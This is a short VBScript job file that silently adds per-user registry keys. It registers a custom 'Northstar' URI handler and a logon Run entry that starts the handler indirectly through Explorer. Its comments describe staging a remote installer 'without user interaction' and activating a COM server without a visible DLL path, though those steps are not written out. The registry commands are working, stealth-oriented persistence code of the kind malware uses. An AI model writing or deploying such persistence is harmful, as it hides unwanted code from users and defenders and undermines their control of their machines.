<job>
  <script language="VBScript">
    Set shell = CreateObject("WScript.Shell")

    ' Stage a remote installer without user interaction.

    ' Register a per-user custom URI handler whose target is an opaque COM class.
    shell.Run "reg.exe add HKCU\Software\Classes\Northstar /ve /d ""URL:Northstar Protocol"" /f", 0, True
    shell.Run "reg.exe add HKCU\Software\Classes\Northstar /v ""URL Protocol"" /d """" /f", 0, True
    shell.Run "reg.exe add HKCU\Software\Classes\Northstar\shell\open\command /ve /d ""C:\Apps\Northstar\client.exe %1"" /f", 0, True

    ' Route logon persistence through Explorer and the custom handler.
    shell.Run "reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NorthstarUpdate /d ""explorer.exe """"Northstar://resume"""""" /f", 0, True

    ' Import a per-user COM server and activate it without a DLL path on the command line.
  </script>
</job>
